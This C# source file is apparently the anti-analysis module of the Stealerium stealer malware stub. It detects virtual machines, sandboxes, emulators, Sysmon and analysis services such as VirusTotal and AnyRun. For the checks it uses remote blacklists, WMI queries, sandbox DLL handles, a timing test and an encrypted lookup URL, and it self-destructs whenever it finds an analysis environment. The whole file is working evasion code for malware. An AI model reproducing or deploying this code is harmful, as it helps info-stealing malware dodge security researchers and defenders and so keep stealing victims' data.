using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Management;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.ServiceProcess;
using System.Text;
using System.Threading.Tasks;
using Microsoft.Win32;
using Stealerium.Stub.Helpers;

namespace Stealerium.Stub.Modules.Implant
{
    internal sealed class AntiAnalysis
    {
        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        // Base URL for fetching blacklist files
        private const string BaseUrl = "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/";

        // URLs to the raw text files in the virustotal-vm-blacklist repository
        private static readonly Dictionary<string, string> ListUrls = new Dictionary<string, string>
        {
            { "PCUsernames", BaseUrl + "pc_username_list.txt" },
            { "PCNames", BaseUrl + "pc_name_list.txt" },
            { "GPUs", BaseUrl + "gpu_list.txt" },
            { "Processes", BaseUrl + "processes_list.txt" },
            { "IPs", BaseUrl + "ip_list.txt" },
            { "MachineGuids", BaseUrl + "MachineGuid.txt" }
        };

        // Static fields to cache the loaded lists as HashSet for O(1) lookups
        private static readonly Dictionary<string, HashSet<string>> Blacklists = new Dictionary<string, HashSet<string>>
        {
            { "PCUsernames", null },
            { "PCNames", null },
            { "GPUs", null },
            { "Processes", null },
            {
                "Services", new HashSet<string>(StringComparer.OrdinalIgnoreCase)
                {
                    "vmicheartbeat",
                    "vmickvpexchange",
                    "vmicrdv",
                    "vmicshutdown",
                    "vmictimesync",
                    "vmicvss",
                    "VmRemoteService",
                    "Sysmon64"
                }
            },
            { "IPs", null },
            { "MachineGuids", null }
        };

        private static readonly HttpClient HttpClient = new HttpClient
        {
            Timeout = TimeSpan.FromSeconds(10) // Set a reasonable timeout
        };

        /// <summary>
        /// Detects if the current PC username is listed in the suspicious PC usernames list.
        /// </summary>
        /// <returns>
        /// Returns <c>true</c> if the current PC username matches any from the loaded list of suspicious PC usernames, 
        /// otherwise returns <c>false</c>.
        /// </returns>
        public static bool SuspiciousPCUsername()
        {
            if (Blacklists["PCUsernames"] == null || !Blacklists["PCUsernames"].Any())
                return false;

            // Get the PC username
            string pcUsername = Environment.UserName.ToLowerInvariant();

            // Check if the PC username is in the suspicious list
            return Blacklists["PCUsernames"].Contains(pcUsername);
        }

        /// <summary>
        /// Detects if the current PC name is listed in the suspicious PC names list.
        /// </summary>
        /// <returns>
        /// Returns <c>true</c> if the current PC name matches any from the loaded list of suspicious PC names, 
        /// otherwise returns <c>false</c>.
        /// </returns>
        public static bool SuspiciousPCName()
        {
            if (Blacklists["PCNames"] == null || !Blacklists["PCNames"].Any())
                return false;

            // Get the PC name
            string pcName = Environment.MachineName.ToLowerInvariant();

            // Check if the PC name is in the suspicious list
            return Blacklists["PCNames"].Contains(pcName);
        }

        /// <summary>
        /// Detects if the system's GPU model is listed in the suspicious GPU list.
        /// </summary>
        /// <returns>
        /// Returns <c>true</c> if any GPU model matches the suspicious list, otherwise returns <c>false</c>.
        /// </returns>
        public static bool SuspiciousGPU()
        {
            if (Blacklists["GPUs"] == null || !Blacklists["GPUs"].Any())
                return false;

            try
            {
                using (var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_VideoController"))
                {
                    foreach (var obj in searcher.Get())
                    {
                        var gpuName = obj["Name"]?.ToString().ToLowerInvariant() ?? string.Empty;
                        foreach (var suspGpu in Blacklists["GPUs"])
                        {
                            if (gpuName.Contains(suspGpu))
                            {
                                Logging.Log($"AntiAnalysis: Suspicious GPU detected: {obj["Name"]}");
                                return true;
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Logging.Log($"AntiAnalysis: Failed to check GPUs. Exception: {ex.Message}");
            }

            return false;
        }

        /// <summary>
        /// Detects if any running process is listed in the suspicious processes list.
        /// </summary>
        /// <returns>
        /// Returns <c>true</c> if any suspicious process is detected, otherwise returns <c>false</c>.
        /// </returns>
        public static bool SuspiciousProcess()
        {
            if (Blacklists["Processes"] == null || !Blacklists["Processes"].Any())
                return false;

            var runningProcesses = Process.GetProcesses();

            foreach (var process in runningProcesses)
            {
                try
                {
                    string processName = process.ProcessName.ToLowerInvariant();
                    if (Blacklists["Processes"].Contains(processName))
                    {
                        Logging.Log($"AntiAnalysis: Suspicious process detected: {process.ProcessName}");
                        return true;
                    }
                }
                catch (Exception ex) when (ex is InvalidOperationException || ex is System.ComponentModel.Win32Exception)
                {
                    Logging.Log($"AntiAnalysis: Failed to access process information: {ex.Message}");
                }
            }

            return false;
        }

        /// <summary>
        /// Detects if any running service is listed in the suspicious services list.
        /// </summary>
        /// <returns>
        /// Returns <c>true</c> if any suspicious running service is detected, otherwise <c>false</c>.
        /// </returns>
        public static bool SuspiciousService()
        {
            if (Blacklists["Services"] == null || !Blacklists["Services"].Any())
                return false;

            try
            {
                var services = ServiceController.GetServices();
                foreach (var service in services)
                {
                    // Check if the service is currently running
                    if (service.Status == ServiceControllerStatus.Running)
                    {
                        string serviceName = service.ServiceName.ToLowerInvariant();
                        if (Blacklists["Services"].Contains(serviceName))
                        {
                            Logging.Log($"AntiAnalysis: Suspicious running service detected: {service.ServiceName}");
                            return true;
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Logging.Log($"AntiAnalysis: Failed to check services. Exception: {ex.Message}");
            }

            return false;
        }

        /// <summary>
        /// Detects if the system's IP address is listed in the suspicious IPs list.
        /// </summary>
        /// <returns>
        /// Returns <c>true</c> if any IP address matches the suspicious list, otherwise returns <c>false</c>.
        /// </returns>
        public static bool SuspiciousIP()
        {
            if (Blacklists["IPs"] == null || !Blacklists["IPs"].Any())
                return false;

            try
            {
                var host = System.Net.Dns.GetHostEntry(System.Net.Dns.GetHostName());
                foreach (var ip in host.AddressList)
                {
                    string ipAddress = ip.ToString();
                    if (Blacklists["IPs"].Contains(ipAddress))
                    {
                        Logging.Log($"AntiAnalysis: Suspicious IP detected: {ipAddress}");
                        return true;
                    }
                }
            }
            catch (Exception ex)
            {
                Logging.Log($"AntiAnalysis: Failed to check IP addresses. Exception: {ex.Message}");
            }

            return false;
        }

        /// <summary>
        /// Detects if the system's Machine GUID is listed in the suspicious Machine GUIDs list.
        /// </summary>
        /// <returns>
        /// Returns <c>true</c> if the Machine GUID matches any from the suspicious list, otherwise returns <c>false</c>.
        /// </returns>
        public static bool SuspiciousMachineGuid()
        {
            if (Blacklists["MachineGuids"] == null || !Blacklists["MachineGuids"].Any())
                return false;

            try
            {
                using (RegistryKey localMachine = Registry.LocalMachine)
                {
                    using (RegistryKey key = localMachine.OpenSubKey(@"SOFTWARE\Microsoft\Cryptography"))
                    {
                        if (key != null)
                        {
                            object guid = key.GetValue("MachineGuid");
                            if (guid != null)
                            {
                                string machineGuid = guid.ToString().ToLowerInvariant();
                                if (Blacklists["MachineGuids"].Contains(machineGuid))
                                {
                                    Logging.Log($"AntiAnalysis: Suspicious Machine GUID detected: {machineGuid}");
                                    return true;
                                }
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Logging.Log($"AntiAnalysis: Failed to retrieve Machine GUID. Exception: {ex.Message}");
            }

            return false;
        }

        /// <summary>
        /// Detects if the file is running in an emulator.
        /// </summary>
        /// <returns>
        /// Returns <c>true</c> if running in an emulator, otherwise <c>false</c>.
        /// </returns>
        public static bool Emulator()
        {
            try
            {
                var ticks = DateTime.Now.Ticks;
                Task.Delay(10).Wait(); // Using Task.Delay for non-blocking wait
                if (DateTime.Now.Ticks - ticks < 10L)
                    return true;
            }
            catch
            {
                return false;
            }

            return false;
        }

        /// <summary>
        /// Detects if the system is hosted in environments like VirusTotal or AnyRun.
        /// </summary>
        /// <returns>
        /// Returns <c>true</c> if hosting is detected, otherwise <c>false</c>.
        /// </returns>
        public static async Task<bool> HostingAsync()
        {
            try
            {
                var decryptedUrl = StringsCrypt.Decrypt(new byte[]
                {
                    145, 244, 154, 250, 238, 89, 238, 36, 197, 152,
                    49, 235, 197, 102, 94, 163, 45, 250, 10,
                    108, 175, 221, 139, 165, 121, 24
                });

                var status = await HttpClient.GetStringAsync(decryptedUrl).ConfigureAwait(false);
                // Replaced Contains with IndexOf to fix CS1501 error
                return status.IndexOf("true", StringComparison.OrdinalIgnoreCase) >= 0;
            }
            catch
            {
                return false;
            }
        }

        /// <summary>
        /// Detects if the system is running in a sandbox.
        /// </summary>
        /// <returns>
        /// Returns <c>true</c> if running in a sandbox, otherwise <c>false</c>.
        /// </returns>
        public static bool SandBox()
        {
            string[] sandboxDlls = { "SbieDll", "SxIn", "Sf2", "snxhk", "cmdvrt32" };
            return sandboxDlls.Any(dll => GetModuleHandle(dll + ".dll") != IntPtr.Zero);
        }

        /// <summary>
        /// Detects if the system is running inside a Virtual Machine.
        /// </summary>
        /// <returns>
        /// Returns <c>true</c> if running inside a Virtual Machine, otherwise <c>false</c>.
        /// </returns>
        public static bool VirtualBox()
        {
            try
            {
                using (var managementObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
                {
                    using (var managementObjectCollection = managementObjectSearcher.Get())
                    {
                        foreach (var obj in managementObjectCollection)
                        {
                            var manufacturer = obj["Manufacturer"]?.ToString().ToLower() ?? string.Empty;
                            var model = obj["Model"]?.ToString().ToLower() ?? string.Empty;

                            if ((manufacturer.Contains("microsoft") && model.Contains("virtual")) ||
                                manufacturer.Contains("vmware") || model.Contains("virtualbox"))
                                return true;
                        }
                    }
                }

                using (var searcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController"))
                {
                    foreach (var obj in searcher.Get())
                    {
                        var name = obj.GetPropertyValue("Name")?.ToString().ToLower() ?? string.Empty;
                        if (name.Contains("vmware") || name.Contains("vbox"))
                            return true;
                    }
                }
            }
            catch
            {
                return false;
            }

            return false;
        }

        /// <summary>
        /// Runs all anti-analysis checks and self-destructs if any hostile environment is detected.
        /// </summary>
        /// <returns>
        /// Returns <c>true</c> if any anti-analysis check detects a hostile environment, 
        /// otherwise returns <c>false</c>.
        /// </returns>
        public static bool Run()
        {
            try
            {
                // Hosting check
                var hostingTask = HostingAsync();
                hostingTask.Wait();
                bool hostingDetected = hostingTask.Result;
                if (hostingDetected)
                {
                    Logging.Log("AntiAnalysis: Hosting detected! Self-destructing...");
                    SelfDestruct.Melt();
                    return true;
                }

                // Suspicious GPU check
                if (SuspiciousGPU())
                {
                    Logging.Log("AntiAnalysis: Suspicious GPU detected! Self-destructing...");
                    SelfDestruct.Melt();
                    return true;
                }

                // Suspicious processes check
                if (SuspiciousProcess())
                {
                    Logging.Log("AntiAnalysis: Suspicious process detected! Self-destructing...");
                    SelfDestruct.Melt();
                    return true;
                }

                // Suspicious services check
                if (SuspiciousService())
                {
                    Logging.Log("AntiAnalysis: Suspicious service detected! Self-destructing...");
                    SelfDestruct.Melt();
                    return true;
                }

                // Virtual Machine check
                if (VirtualBox())
                {
                    Logging.Log("AntiAnalysis: Virtual Machine detected! Self-destructing...");
                    SelfDestruct.Melt();
                    return true;
                }

                // Sandbox check
                if (SandBox())
                {
                    Logging.Log("AntiAnalysis: Sandbox detected! Self-destructing...");
                    SelfDestruct.Melt();
                    return true;
                }

                // Emulator check
                if (Emulator())
                {
                    Logging.Log("AntiAnalysis: Emulator detected! Self-destructing...");
                    SelfDestruct.Melt();
                    return true;
                }

                // Suspicious IP check
                if (SuspiciousIP())
                {
                    Logging.Log("AntiAnalysis: Suspicious IP detected! Self-destructing...");
                    SelfDestruct.Melt();
                    return true;
                }

                // Suspicious PC name check
                if (SuspiciousPCName())
                {
                    Logging.Log("AntiAnalysis: Suspicious PC name detected! Self-destructing...");
                    SelfDestruct.Melt();
                    return true;
                }

                // Suspicious PC username check
                if (SuspiciousPCUsername())
                {
                    Logging.Log("AntiAnalysis: Suspicious PC username detected! Self-destructing...");
                    SelfDestruct.Melt();
                    return true;
                }

                // Suspicious Machine GUID check
                if (SuspiciousMachineGuid())
                {
                    Logging.Log("AntiAnalysis: Suspicious Machine GUID detected! Self-destructing...");
                    SelfDestruct.Melt();
                    return true;
                }

                return false;
            }
            catch (Exception ex)
            {
                Logging.Log($"AntiAnalysis: An error occurred during anti-analysis checks. Exception: {ex.Message}");
                return false;
            }
        }
    }
}
